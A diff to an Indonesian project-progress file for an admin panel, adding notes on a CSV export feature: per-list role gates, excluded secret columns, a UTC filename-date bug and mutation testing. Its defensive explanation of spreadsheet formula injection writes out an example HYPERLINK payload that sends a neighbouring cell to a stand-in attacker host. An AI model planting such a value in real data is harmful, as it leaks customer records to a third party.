@@ -67,7 +67,7 @@
 | 4 | ✅ selesai (22 Sep), `backend/` dihapus | — (4.26, 4.28, 4.29, 4.31 semua tuntas; 4.31 ternyata sudah divalidasi di kode — yang kurang adalah testnya, dan penulisannya menemukan `db-error.ts` tidak membaca `error.code`) |
 | 3 | ✅ inti selesai | 3.22 (butuh migration); 3.21 tuntas — proyek Supabase-nya sudah tidak ada, jadi eksposur PostgREST tidak berlaku; 3.20 ditunda dengan alasan tertulis — skripnya ditulis untuk Supabase dan akan memutus aplikasi di DB yang sungguh dipakai |
 | 2 | ✅ selesai | — |
-| 5 | 🔶 sebagian | 5.17 (ditunda ke fase migration, alasan tertulis), 5.21–5.29 (5.7, 5.9, 5.12, 5.18, 5.20, 5.30, 5.33 tuntas; angka "42 titik `h-screen`" di laporan salah — sebenarnya 15; kelas KPI di 5.9 juga salah — `lg:grid-cols-3` di `:126`, bukan `lg:grid-cols-4` di `:80`; premis 5.18 "nol pagination di seluruh admin" juga salah — keempat daftar sudah paginasi, cacatnya nomor halaman tidak dijepit ke atas; premis 5.20 juga basi — dua daftar sudah punya saringan status, dan yang ditemukan justru bahwa 5.19 ditandai selesai atas pencarian sisi-klien yang menjawab salah) |
+| 5 | 🔶 sebagian | 5.17 (ditunda ke fase migration, alasan tertulis), 5.22–5.29 (5.7, 5.9, 5.12, 5.18, 5.20, 5.21, 5.30, 5.33 tuntas; angka "42 titik `h-screen`" di laporan salah — sebenarnya 15; kelas KPI di 5.9 juga salah — `lg:grid-cols-3` di `:126`, bukan `lg:grid-cols-4` di `:80`; premis 5.18 "nol pagination di seluruh admin" juga salah — keempat daftar sudah paginasi, cacatnya nomor halaman tidak dijepit ke atas; premis 5.20 juga basi — dua daftar sudah punya saringan status, dan yang ditemukan justru bahwa 5.19 ditandai selesai atas pencarian sisi-klien yang menjawab salah) |
 | 6 | 🔶 sebagian | 6.16, 6.27–6.29 (6.23 & 6.24 tuntas — 6.23 ternyata lebih berat dari yang tercatat: kolom `number` memotong nomor rekening refund tanpa menolaknya, dan potongannya masih lolos validator server, jadi uang refund menuju rekening yang berbeda dari yang diketik pembeli; 6.25 & 6.26 diperiksa dan ternyata sudah benar — nol 404 di `Navbar.tsx`, ketiga "CTA mati" hidup semua) |
 | 7 | ✅ inti selesai | 7.17 tuntas — kebijakan privasi & S&K terbit sebagai data yang dijaga test terhadap `schema.prisma`, bukan teks mati; 7.18 ditunda dengan alasan tertulis — kolom penopangnya dihapus di 3.27 dan alur verifikasi butuh tabel token baru (migration), sementara rekomendasi laporannya sendiri akan mengunci seluruh akun existing |
 | 8 | ✅ selesai | — (8.9 tuntas: nol dependency mati DAN nol paket diimpor tanpa terdaftar, kedua arah kini dijaga test; 8.5 tuntas; 8.11 ditolak — rekomendasinya salah; 8.13–8.17 temuan baru, semuanya tuntas) |
@@ -532,7 +532,7 @@ Perlindungan yang task-task itu maksudkan **tetap harus ada** — ditulis di rou
 | 5.18 | ⚠️ Komponen paginasi bersama. **Premis laporan sudah basi** (lihat catatan di bawah): bukan "nol pagination" — keempat daftar admin sudah punya `skip`/`take`/`count` dan tombol halaman. Yang benar-benar ada adalah duplikasi berempat, dan **keempatnya salah dengan cara yang sama: nomor halaman dijepit ke bawah, tidak ke atas** | `[05]F-24` | [x] |
 | 5.19 | Hubungkan search box yang mati — tanpa `value`/`onChange`, user mengetik dan tidak terjadi apa-apa. **Ditandai selesai terlalu dini**: penghubungannya menyaring 30 baris satu halaman, jadi mencari "Budi" menjawab "tidak ada" selama Budi di halaman 2. Dituntaskan di 5.20 dengan memindahkan pencarian ke `where` Prisma | `[05]F-25` | [x] |
 | 5.20 | ⚠️ Filter & sort pada tabel admin. **Premis laporan sudah basi** (lihat catatan di bawah): `orders` dan `pengajuan` sudah punya saringan status. Yang tidak ada sama sekali adalah **pencarian yang menyaring di database** dan **pengurutan** — dan 5.19 ditandai selesai atas kotak cari yang menyaring 30 baris satu halaman, jadi mencari "Budi" menjawab "tidak ada" selama Budi ada di halaman 2 | `[05]` | [x] |
-| 5.21 | Export CSV/Excel | `[05]` | [ ] |
+| 5.21 | Export CSV/Excel. Satu route untuk keempat daftar, `where`/`orderBy` dipakai bersama halamannya lewat `@/lib/saringan-daftar` — dan gerbangnya diputuskan ULANG per daftar, lebih sempit daripada pintu panel | `[05]` | [x] |
 | 5.22 | Date-range filter di dashboard/revenue | `[05]` | [ ] |
 | 5.23 | Kalender ketersediaan / timeline booking untuk admin | `[05]` | [ ] |
 | 5.24 | Audit log viewer | `[05]` | [ ] |
@@ -746,6 +746,129 @@ membuat suite hijau tanpa menjaga apa pun:
 4. "cocok dengan" dicari di seluruh berkas, dan di `UserClientPage` frasa itu juga
    dipakai subjudulnya ("3 pengguna cocok dengan …"). Keadaan kosong yang
    dikembalikan ke "Belum ada pengguna" pada **kedua** cabang tetap lolos.
+
+### Catatan 5.21 — berkas yang keluar dari aplikasi, dan tiga hal yang tidak dijaga header HTTP
+
+Berkas ekspor punya satu sifat yang tidak dimiliki halaman: **ia keluar dari
+kendali aplikasi ini, selamanya.** Begitu tersimpan di laptop atau terkirim lewat
+surel, tidak ada gerbang peran, tidak ada masa sesi, tidak ada cara menariknya
+kembali. Tiga akibatnya menentukan seluruh bentuk butir ini.
+
+**1. Gerbangnya diputuskan ULANG per daftar, bukan diwarisi dari pintu panel.**
+`admin/(dashboard)/layout.tsx` meloloskan `ADMIN`, `SUPER_ADMIN`, `CS`, dan
+`OPERATOR` ke seluruh panel, dan itu wajar untuk membaca 25 baris sekali duduk di
+dalam aplikasi. Satu berkas berisi **seluruh** basis pelanggan beserta emailnya
+adalah hal yang berbeda jenisnya, bukan berbeda jumlahnya. Jadi:
+
+| Daftar | Gerbang ekspor | Alasan |
+|---|---|---|
+| `billboards` | `PERAN_PEMBACA_PANEL` | inventori, bukan data orang — sama dengan pintu panel |
+| `orders` | `PERAN_PEMBACA_PESANAN` | email + WhatsApp pembeli; CS tidak ikut |
+| `users` | `PERAN_PENGELOLA` | seluruh basis pelanggan |
+| `pengajuan` | `PERAN_PENGELOLA` | nomor pemilik lahan yang diserahkan supaya DIHUBUNGI, bukan supaya dibawa keluar |
+
+Gerbang sesungguhnya di route; halaman hanya menentukan tombolnya **digambar**.
+Keduanya diperlukan: tombol yang selalu tampak lalu menjawab 403 adalah tombol
+yang tampak rusak, dan CS akan melaporkannya sebagai bug alih-alih memahami bahwa
+ekspor pesanan memang bukan haknya. `UserClientPage` (Client Component) menerima
+**boolean jadi**, bukan `Role` — props komponen client tertanam di HTML halaman,
+jadi perbandingan peran di sana adalah gerbang yang bisa dibaca siapa pun.
+
+**2. Injeksi rumus spreadsheet: ancaman yang tidak bisa ditahan header apa pun.**
+Nilai yang dimulai `=`, `+`, `-`, `@`, tab, atau CR **dieksekusi sebagai rumus**
+oleh Excel/LibreOffice/Sheets. Dan kolom yang diekspor di sini sebagian besar
+diisi **pembeli**: `name`, `companyName`, `whatsapp`, `namaPemilik`, `alamat`.
+Seorang pembeli bisa mendaftar dengan nama perusahaan
+`=HYPERLINK("https://jahat.example/?d="&A1,"Klik untuk detail")`, dan setiap admin
+yang membuka ekspornya melihat tautan yang tampak wajar di tengah tabel internal;
+satu klik mengirim isi sel tetangganya — data pelanggan lain — ke pihak ketiga.
+
+Ini **bukan** kerentanan web: peramban tidak menjalankan apa pun. Yang
+menjalankannya adalah spreadsheet di laptop admin, jadi tidak satu pun header
+keamanan HTTP bisa menghalanginya. Yang bisa hanya penyusun CSV-nya.
+
+Penahannya: nilai berisiko **diawali TAB lalu seluruhnya dikutip** — bukan
+karakternya dibuang. Membuangnya adalah pilihan yang salah dan menggoda: nomor
+telepon sah ditulis `+6281…` dan nominal negatif ditulis `-50000`, jadi ekspor
+yang mengubahnya menghasilkan nomor yang tidak bisa dihubungi dan angka yang tidak
+bisa dijumlahkan. Keamanan dan kebenaran data dua-duanya bisa didapat di sini,
+jadi mengorbankan satu tidak diterima.
+
+**3. Barisnya wajib sama dengan layar, dan itu sebabnya ada
+`src/lib/saringan-daftar.ts`.** `where` dan `orderBy` keempat daftar dipindahkan
+ke modul bersama yang dipakai halaman **dan** route ekspor. Ekspor yang menyusun
+klausanya sendiri tidak menghasilkan galat — ia menghasilkan berkas yang **terbuka
+dengan sempurna** memuat himpunan baris yang berbeda dari yang diminta, dan berkas
+itu dipakai untuk rekonsiliasi uang.
+
+Yang dikerjakan:
+
+- `src/lib/csv.ts` — `sel()`, `berisikoRumus()`, `keCsv()`, `namaBerkasCsv()`,
+  `headerCsv()`. BOM UTF-8 (tanpa itu Excel di Windows membaca `windows-1252` dan
+  setiap nama beraksen jadi karakter acak, lalu admin menyimpulkan datanya rusak
+  di database) dan CRLF sesuai RFC 4180.
+- `src/lib/saringan-daftar.ts` — rumah baru bagi `where`/`URUT` keempat daftar,
+  dipakai bersama halamannya.
+- `src/app/api/admin/ekspor/route.ts` — satu route, empat daftar lewat `?daftar=`.
+  Urutan pemeriksaannya: **sesi → nama daftar → peran**. Sesi lebih dulu supaya
+  jawaban 400 "daftar tidak dikenal" tidak memberi tahu nama daftar mana yang ada
+  kepada pihak yang belum berhak tahu route ini pun ada. Peran ditolak dijawab
+  **403, bukan 401** — 401 membuat klien menyimpulkan sesinya kedaluwarsa lalu
+  menyuruh orangnya masuk ulang untuk mendapat jawaban yang sama.
+- `src/components/admin/TombolEkspor.tsx` — Server Component, `<a>` biasa. Nol
+  JavaScript: `fetch` + `createObjectURL` menahan dua salinan berkas di memori tab
+  yang juga sedang merender tabelnya, dan menuntut `'use client'` beserta keadaan
+  galat dan progresnya sendiri. `download` **sengaja tidak dipasang** — ia memaksa
+  nama berkas dari sisi klien dan mengabaikan `Content-Disposition` milik server,
+  termasuk tanggal yang sengaja ditaruh di sana.
+
+Keputusan yang tidak kelihatan dari kodenya:
+
+- **`angkaRupiah()` tidak dipakai sama sekali.** Ia `Intl.NumberFormat('id-ID')`,
+  jadi `15000000` menjadi `15.000.000` — dan di spreadsheet itu terbaca sebagai
+  **TEKS**, yang tidak bisa dijumlahkan. Itu satu-satunya alasan berkas ini
+  diminta. Nominal karena itu lewat `keAngka()`.
+- **`take: BATAS + 1` lalu dipotong**, bukan `count()` kedua: query tambahan atas
+  tabel yang sama bisa menjawab angka berbeda dari `findMany` di sebelahnya,
+  sementara yang dibutuhkan hanya satu bit — masih ada lagi atau tidak. Penandanya
+  ditulis **sebagai baris di dalam berkas**, bukan hanya header
+  `X-Ekspor-Terpotong`: header tidak ikut saat berkasnya disimpan, dikirim lewat
+  surel, atau dibuka bulan depan, dan yang membaca berkas terpotong tanpa tahu
+  akan mencari selisihnya di pembukuan.
+- **Kolom rahasia tidak pernah ikut**, masing-masing dengan alasan tertulis:
+  `password` (hash bcrypt — bahan serangan luring), `ktp`, `npwp`, `ktpAddress`,
+  `officeAddress`, `xenditCustomerId`, `userBankName`/`userBankAccount` (nomor
+  rekening pembeli: cukup untuk memulai penipuan), `refundProof`, dan seluruh kolom
+  provider. Dijaga dua arah: `select` yang benar-benar dijalankan diperiksa, **dan**
+  nama-namanya dituntut tidak muncul di sumber route sama sekali.
+- **Daftar kosong tetap mengirim judul kolom.** Berkas nol bita tidak bisa
+  dibedakan dari unduhan yang gagal.
+- **Nomor halaman tidak ikut dibawa tombolnya.** Yang diekspor adalah seluruh hasil
+  saringan; ekspor sehalaman adalah salinan layar yang sudah ada di layar.
+
+**Satu cacat ditemukan sambil menulis test, di kode yang baru saja ditulis
+sendiri:** `namaBerkasCsv` memakai `toISOString().slice(0, 10)` — memotong tanggal
+**di UTC**. Ekspor yang diambil 1 Oktober pukul 06.00 WIB bernama
+`pengguna-2026-09-30.csv`. Karena satu-satunya alasan tanggal itu ada adalah
+membandingkan dua titik waktu, nama yang menyebut hari sebelumnya merusak
+keperluan yang membuatnya ditulis — dan paling sering tepat di **batas bulan**,
+tempat angkanya dijumlahkan. Diperbaiki ke `kunciTanggal()`, yaitu fungsi yang
+docstring-nya di `src/lib/tanggal.ts` sudah menyebut anti-pola ini persis.
+
+94 test baru (`ekspor CSV daftar admin (butir 5.21)`), **12/12 mutasi
+tertangkap**, `2036 lulus / 0 gagal`, `tsc` bersih, `eslint` bersih.
+
+Satu mutasi lolos di putaran pertama, dan ia lolos dari pengikat cacat yang baru
+saja diperbaiki di atas: assertion nama berkas memakai `2026-09-29T10:00:00Z`
+— yaitu 17.00 WIB, **hari yang sama pada kedua rumus**. Pengikat yang memakai
+tengah hari lulus atas rumus UTC maupun WIB sekaligus, dan itu justru bentuk
+pengikat yang membuat cacat ini bisa masuk tanpa terlihat. Diganti ke dua instan
+**di ambang** (30 September 23.00 UTC = 1 Oktober 06.00 WIB, dan 1 Oktober 16.59
+UTC = 1 Oktober 23.59 WIB).
+
+Pelajarannya sama dengan empat mutasi lolos di 5.20, dari arah lain: di sana
+assertion diuji atas cakupan yang terlalu luas, di sini atas **nilai masukan yang
+terlalu jinak**. Keduanya menghasilkan suite hijau yang tidak mengikat apa pun.
 
 ---
 
